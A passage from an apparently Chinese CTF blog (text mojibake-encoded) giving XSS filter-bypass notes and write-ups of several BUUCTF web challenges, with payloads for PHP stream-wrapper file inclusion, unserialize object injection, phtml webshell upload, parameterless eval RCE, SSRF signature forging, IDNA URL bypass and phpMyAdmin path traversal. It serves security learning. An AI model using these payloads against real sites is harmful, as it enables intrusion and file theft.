ï¼ˆä½œç”¨ï¼šå¯ä»¥é˜²æ­¢é¡µé¢è¢«XSSæ”»å‡»æ—¶ï¼ŒåµŒå…¥ç¬¬ä¸‰æ–¹çš„è„šæœ¬æ–‡ä»¶ç­‰ï¼‰</span><br><span class="line">    ï¼ˆç¼ºé™·ï¼šIEæˆ–ä½ç‰ˆæœ¬çš„æµè§ˆå™¨å¯èƒ½ä¸æ”¯æŒï¼‰</span><br><span class="line">    2.åœ¨è®¾ç½®Cookieæ—¶ï¼ŒåŠ ä¸ŠHttpOnlyå‚æ•°</span><br><span class="line">    ï¼ˆä½œç”¨ï¼šå¯ä»¥é˜²æ­¢é¡µé¢è¢«XSSæ”»å‡»æ—¶ï¼ŒCookieä¿¡æ¯è¢«ç›—å–ï¼Œå¯å…¼å®¹è‡³IE6ï¼‰</span><br><span class="line">    ï¼ˆç¼ºé™·ï¼šç½‘ç«™æœ¬èº«çš„JSä»£ç ä¹Ÿæ— æ³•æ“ä½œCookieï¼Œè€Œä¸”ä½œç”¨æœ‰é™ï¼Œåªèƒ½ä¿è¯Cookieçš„å®‰å…¨ï¼‰</span><br><span class="line">    3.åœ¨å¼€å‘APIæ—¶ï¼Œæ£€éªŒè¯·æ±‚çš„Refererå‚æ•°</span><br><span class="line">    ï¼ˆä½œç”¨ï¼šå¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢CSRFæ”»å‡»ï¼‰</span><br><span class="line">    ï¼ˆç¼ºé™·ï¼šIEæˆ–ä½ç‰ˆæœ¬çš„æµè§ˆå™¨ä¸­ï¼ŒRefererå‚æ•°å¯ä»¥è¢«ä¼ªé€ ï¼‰</span><br></pre></td></tr></table></figure>

<p>XSS-gamesç•¥æœ‰å¿ƒå¾—</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.æ— ä»»ä½•è¿‡æ»¤&lt;script&gt;alert(1);&lt;&#x2F;script&gt;</span><br><span class="line">2.å¸¦æœ‰&lt;input&gt;æ ‡ç­¾ï¼Œå…ˆé—­åˆå‚æ•°å†è¿›è¡ŒXSSæ³¨å…¥</span><br><span class="line">3.å°–æ‹¬å·è¢«è§£æï¼Œç”¨onclickäº‹ä»¶åŒ…å«åœ¨&lt;&gt;å†…,onclick&#x3D;&#39;javascript:alert(1)&#39;</span><br><span class="line">4.onclick,scriptéƒ½è¢«è¿‡æ»¤,ç”¨hrefæ–¹æ³•&lt;a href&#x3D;javasacript:alert(1)&gt;</span><br><span class="line">5.href script onclick éƒ½è¢«è¿‡æ»¤äº† å¯ä»¥å°è¯•ä¸‹å¤§å°å†™ç»•è¿‡</span><br><span class="line">6.å¯¹ on href script è¿›è¡Œäº†å®Œå…¨å±è”½,å¯ä»¥åŒå†™ç»•è¿‡ï¼Œå› ä¸ºåªè¿‡æ»¤äº†ä¸€æ¬¡</span><br><span class="line">7.ç»™äº†ä¸€ä¸ªé“¾æ¥ï¼Œç›¸å½“äºä¸€ä¸ªæ ‡ç­¾æ³¨å…¥ï¼Œscriptè¢«è½¬ä¹‰ï¼ŒåŒå†™å¤§å°å†™éƒ½ä¸è¡Œï¼Œå¯ä»¥ç”¨HTMLå­—ç¬¦è½¬æ¢ç»•è¿‡ï¼Œè½¬æˆ16è¿›åˆ¶æˆ–10è¿›åˆ¶</span><br><span class="line">8.éœ€è¦http:&#x2F;&#x2F;,æºç ä¸­è¦åŒ¹é…</span><br><span class="line">9.user-agentã€cookieã€refererå¤„éƒ½å¯èƒ½æ˜¯æ³¨å…¥ç‚¹</span><br><span class="line">10.ä¸Šä¼ å«æœ‰XSSä»£ç çš„å›¾ç‰‡è§¦å‘æ¼æ´</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Xssæ€»ç»“</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj2</title>
    <url>/2020/05/11/buuoj2/</url>
    <content><![CDATA[<h4 id="0X01-ZJCTF-2019-NiZhuanSiWei"><a href="#0X01-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="0X01:[ZJCTF 2019]NiZhuanSiWei"></a>0X01:[ZJCTF 2019]NiZhuanSiWei<a id="more"></a></h4><p>ç»™äº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>pass1:</p>
<p>ç”¨dataåè®®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure>

<img src="/2020/05/11/buuoj2/1.png" class="">

<p>pass2ï¼š</p>
<p>ç”¨filteråè®®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°base64åŠ å¯†çš„æºç ï¼Œè§£å¯†ï¼Œæ˜¯ä¸ªç®€å•çš„åºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=<span class="keyword">new</span> Flag();</span><br><span class="line">$a-&gt;file=<span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);<span class="comment">//è®©file=flag.phpå³å¯</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆpayload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">text=data:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/05/11/buuoj2/2.png" class="">

<h4 id="0X02-ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#0X02-ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="0X02:[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>0X02:[ACTF2020 æ–°ç”Ÿèµ›]Include</h4><p>æ‰“å¼€é¢˜ç›®ï¼Œæœ‰ä¸€ä¸ªè·³è½¬é“¾æ¥ï¼Œç‚¹å‡»</p>
<img src="/2020/05/11/buuoj2/4.png" class="">

<p>ç›´æ¥ç”¨filterè¯»å–flag.php</p>
<img src="/2020/05/11/buuoj2/3.png" class="">

<p>base64è§£å¯†å°±èƒ½æ‹¿åˆ°flag</p>
<h4 id="0X03-ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#0X03-ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="0X03:[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>0X03:[ACTF2020 æ–°ç”Ÿèµ›]Upload</h4><p>æŸ¥çœ‹ç½‘é¡µæºç ï¼Œæœ‰jså‰ç«¯éªŒè¯ï¼Œç›´æ¥å»æ‰</p>
<p>ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶ï¼Œæç¤ºåªèƒ½ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶</p>
<p>å°è¯•åç¼€ç»•è¿‡ï¼ŒphtmlæˆåŠŸä¸Šä¼ ï¼Œè¿ä¸Šèšå‰‘ï¼Œæ‹¿åˆ°flag</p>
<img src="/2020/05/11/buuoj2/5.png" class="">

<p>ä»æ‹¿åˆ°çš„æºç å¯ä»¥çœ‹åˆ°è€ƒç‚¹å°±æ˜¯phtml</p>
<h4 id="0X04-De1CTF-2019-SSRF-Me"><a href="#0X04-De1CTF-2019-SSRF-Me" class="headerlink" title="0X04:[De1CTF 2019]SSRF Me"></a>0X04:[De1CTF 2019]SSRF Me</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):     </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>åœ¨/De1taé¡µé¢æˆ‘ä»¬getæ–¹æ³•ä¼ å…¥paramå‚æ•°å€¼ï¼Œåœ¨cookieé‡Œé¢ä¼ é€’actionå’Œsignçš„å€¼,å°†ä¼ é€’çš„paramé€šè¿‡wafè¿™ä¸ªå‡½æ•°,wafå‡½æ•°è¿‡æ»¤äº†ä»¥fileå’Œgopherå¼€å¤´çš„ï¼Œä¼ å‚æ„é€ Taskç±»ï¼Œè°ƒç”¨execæ–¹æ³•ï¼ŒcheckSignéªŒè¯ç™»å½•</p>
<img src="/2020/05/11/buuoj2/6.png" class="">

<p>ä¸Šé¢çš„åˆ†æå¯ä»¥çŸ¥é“ï¼Œaction=readscanæˆ–è€…scanread</p>
<img src="/2020/05/11/buuoj2/8.png" class="" title="e">

<p>å½“æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°actionå’Œparamç»è¿‡getSignè¿™ä¸ªå‡½æ•°ä¹‹åä¸signç›¸ç­‰ï¼Œå°±è¿”å›true</p>
<p>è¿”å›trueä¹‹ååˆ™è¿›å…¥ifè¯­å¥é‡Œé¢</p>
<img src="/2020/05/11/buuoj2/7.png" class="">

<p>éœ€è¦secert_key+param+actionä¸‰ä¸ªå­—ç¬¦ä¸²è¿æ¥èµ·æ¥ä¹‹åè¿›è¡Œmd5åŠ å¯†ä½œä¸ºè¿”å›å€¼</p>
<p>è°ƒç”¨geneSignè·¯ç”±å¯ä»¥æ‹¿åˆ°secret_keyï¼Œå†ç»™paramä¼ å€¼ï¼Œparam=flag.txtread,å¾—åˆ°éœ€è¦çš„MD5å€¼</p>
<img src="/2020/05/11/buuoj2/10.png" class="">

<h4 id="0X05-ASIS-2019-Unicorn-shop"><a href="#0X05-ASIS-2019-Unicorn-shop" class="headerlink" title="0X05:[ASIS 2019]Unicorn shop"></a>0X05:[ASIS 2019]Unicorn shop</h4><p>æ‰“å¼€æ˜¯ä¸€ä¸ªè´­ä¹°ç•Œé¢ï¼Œæœ‰å››ç§å•†å“ï¼Œéšä¾¿é€‰ä¸€ä¸ªï¼Œè¾“å…¥ä»·æ ¼</p>
<img src="/2020/05/11/buuoj2/12.png" class="">

<p>åªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œçœ‹ä¸€ä¸‹æºç ï¼Œæ‰¾åˆ°äº†ç‚¹æç¤º</p>
<img src="/2020/05/11/buuoj2/11.png" class="">

<p>ç”¨utf-8çš„ç¼–ç æ¥è´­ä¹°ï¼Œä»·æ ¼è¦å¤§äº4å·å•†å“çš„ä»·æ ¼ï¼Œæ‰¾äº†ä¸€ä¸ªç½‘ç«™ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹</p>
<p><a href="https://www.compart.com/en/unicode/U+2187" target="_blank" rel="noopener">https://www.compart.com/en/unicode/U+2187</a></p>
<p>æœç´¢ä¸€ä¸‹thousandï¼Œæ‰¾ä¸€ä¸ªå­—ç¬¦ï¼Œä¿®æ”¹0xä¸º%å³å¯</p>
<img src="/2020/05/11/buuoj2/13.png" class="" title="examplename">

<h4 id="0X06-GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#0X06-GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="0X06:[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>0X06:[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h4><p>æ‰“å¼€é¢˜ç›®æ²¡ä»€ä¹ˆæç¤ºï¼Œæ‰«æä¸€å‘</p>
<img src="/2020/05/11/buuoj2/14.png" class="">

<p>å‘ç°äº†.gitæ³„éœ²ï¼Œgitæ”»å‡»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œçœ‹äº†åˆ«çš„å¸ˆå‚…çš„wpï¼Œè¯´æ˜¯æ— å‚RCEï¼Œå­¦ä¹ ä¸€ä¸‹</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚</span><br><span class="line">scandir() åˆ—å‡º images ç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚</span><br><span class="line">readfile() è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚</span><br><span class="line">current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚</span><br><span class="line">pos() current() çš„åˆ«åã€‚</span><br><span class="line">next() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">array_reverse()ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ã€‚</span><br><span class="line">highlight_file()æ‰“å°è¾“å‡ºæˆ–è€…è¿”å› filename æ–‡ä»¶ä¸­è¯­æ³•é«˜äº®ç‰ˆæœ¬çš„ä»£ç ã€‚</span><br></pre></td></tr></table></figure>

<img src="/2020/05/11/buuoj2/15.png" class="">

<h4 id="0X07-SUCTF-2019-Pythonginx"><a href="#0X07-SUCTF-2019-Pythonginx" class="headerlink" title="0X07:[SUCTF 2019]Pythonginx"></a>0X07:[SUCTF 2019]Pythonginx</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 333"</span></span><br><span class="line">   </span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure>

<p>ç»™äº†æºç ï¼Œæ‰¾äº†èµ„æ–™ï¼Œå‘ç°ä¸€å¼ å¾ˆæœ‰ç”¨çš„å›¾ç‰‡</p>
<img src="/2020/05/11/buuoj2/16.png" class="">

<p>ä»æºç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œurlå‰é¢éƒ¨åˆ†æ˜¯suctf.cc,ä½†æ˜¯æºç ä¸­è¿›è¡Œäº†æ›¿æ¢ï¼Œæ‰€ä»¥cå¯ä»¥ç”¨câ„†ä»£æ›¿</p>
<p>å†æ˜¯æœ‰å…³nginxçš„</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Nginxé…ç½®æ–‡ä»¶</span><br><span class="line">é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx</span><br><span class="line">ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf</span><br><span class="line">ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service</span><br><span class="line">æ¨¡å—ï¼š/usr/lisb64/nginx/modules</span><br><span class="line">åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx</span><br><span class="line">ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html</span><br><span class="line">æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx</span><br><span class="line">é…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>

<p>payloadï¼šfile://suctf.câ„†sr/local/nginx/conf/nginx.confï¼Œæ‰¾åˆ°flagæ‰€åœ¨</p>
<img src="/2020/05/11/buuoj2/17.png" class="">

<h4 id="0X08-GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#0X08-GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="0X08:[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>0X08:[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h4><p>ä¸€å †ä¹±ç ï¼Œæ‰«æï¼Œå‘ç°robots.txt,è¿˜æ‰¾åˆ°äº†phpmyadmin,æ²¡æœ‰å¯†ç ç›´æ¥ç™»å½•</p>
<img src="/2020/05/11/buuoj2/18.png" class="" title="examplename">

<img src="/2020/05/11/buuoj2/19.png" class="" title="examplename">

<p>åç»­æ€è·¯é™„ä¸Šä¸€ç¯‡æ–‡ç« <a href="https://www.jianshu.com/p/fb9c2ae16d09" target="_blank" rel="noopener">https://www.jianshu.com/p/fb9c2ae16d09</a></p>
<p>payloadï¼š?target=db_datadict.php%253f/../../../../../../../../flag</p>
<img src="/2020/05/11/buuoj2/20.png" class="">

